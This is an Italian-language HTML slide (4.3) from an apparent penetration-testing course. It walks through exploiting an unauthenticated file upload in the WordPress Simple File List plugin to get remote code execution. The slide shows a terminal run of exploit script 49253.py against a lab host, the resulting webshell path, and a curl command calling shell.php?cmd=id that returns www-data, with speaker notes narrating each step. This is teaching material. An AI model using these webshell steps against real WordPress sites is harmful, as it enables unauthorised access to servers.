@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Capitolo 4: Exploitation - Esecuzione Exploit</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Capitolo 4: Exploitation</h1>
+        <div class="subtitle">Slide 4.3: Esecuzione dell'Exploit RCE</div>
+
+        <div class="grid-2-col">
+            <div class="card border-blue">
+                <div class="card-title">Teoria: File Upload to RCE</div>
+                <div class="card-text">
+                    <p>L'Arbitrary File Upload diventa RCE quando:</p>
+                    <br>
+                    <ol style="margin-left: 20px;">
+                        <li>Il server esegue file PHP (✓ Apache + mod_php)</li>
+                        <li>Possiamo caricare file .php (✓ no filter)</li>
+                        <li>Conosciamo il path del file caricato (✓ prevedibile)</li>
+                        <li>Possiamo accedere al file via HTTP (✓ in webroot)</li>
+                    </ol>
+                    <br>
+                    <p><strong>Catena di attacco:</strong></p>
+                    <div class="code-box">1. Upload webshell.php → Plugin directory
+2. Accesso: /wp-content/plugins/.../webshell.php
+3. Esecuzione comandi via ?cmd=whoami</div>
+                    <br>
+                    <p class="security-insight"><strong>Security Insight:</strong> Questa vulnerabilità è così grave perché bypasssa completamente l'autenticazione WordPress. Chiunque su Internet può ottenere RCE.</p>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">Lab: Exploit in Azione</div>
+                <div class="card-text">
+                    <p><strong>Step 1: Eseguiamo l'exploit</strong></p>
+                    <div class="code-box"><span class="text-yellow">┌──(kali㉿kali)-[~]</span>
+<span class="text-red">└─$</span> python3 49253.py http://vulnerable-wp.local</div>
+                    <br>
+                    <p><strong>Output:</strong></p>
+                    <div class="code-box">[*] Targeting: http://vulnerable-wp.local
+[*] Uploading webshell...
+<span class="text-green">[+] Webshell uploaded successfully!</span>
+[+] Shell URL: http://vulnerable-wp.local/wp-content/plugins/simple-file-list/ee-files/shell.php</div>
+                    <br>
+                    <p><strong>Step 2: Verifichiamo RCE</strong></p>
+                    <div class="code-box"><span class="text-red">└─$</span> curl "http://vulnerable-wp.local/wp-content/plugins/simple-file-list/ee-files/shell.php?cmd=id"
+
+<span class="text-green">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></div>
+                    <br>
+                    <p><span class="text-green">✓ RCE CONFERMATO!</span> Siamo www-data sul server.</p>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+
+    <!-- 
+        SPEAKER NOTES:
+        "Ora eseguiamo l'exploit. A sinistra, la teoria del file upload to RCE - i 4 requisiti che devono essere soddisfatti.
+        Nel nostro caso, tutti e 4 sono verdi. Il server esegue PHP, non filtra le estensioni, il path è noto.
+        A destra, l'esecuzione. python3 49253.py con l'URL del target.
+        L'exploit carica una webshell e ci dice dove trovarla.
+        Verifichiamo con curl passando ?cmd=id. Risposta: uid=33(www-data).
+        Siamo DENTRO. Eseguiamo comandi come l'utente www-data, che è l'utente del web server Apache.
+        Questo è il momento in cui un attacco teorico diventa reale. Da qui, possiamo fare quasi qualsiasi cosa."
+    -->
+
+    <script>const slideNumero = 26;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
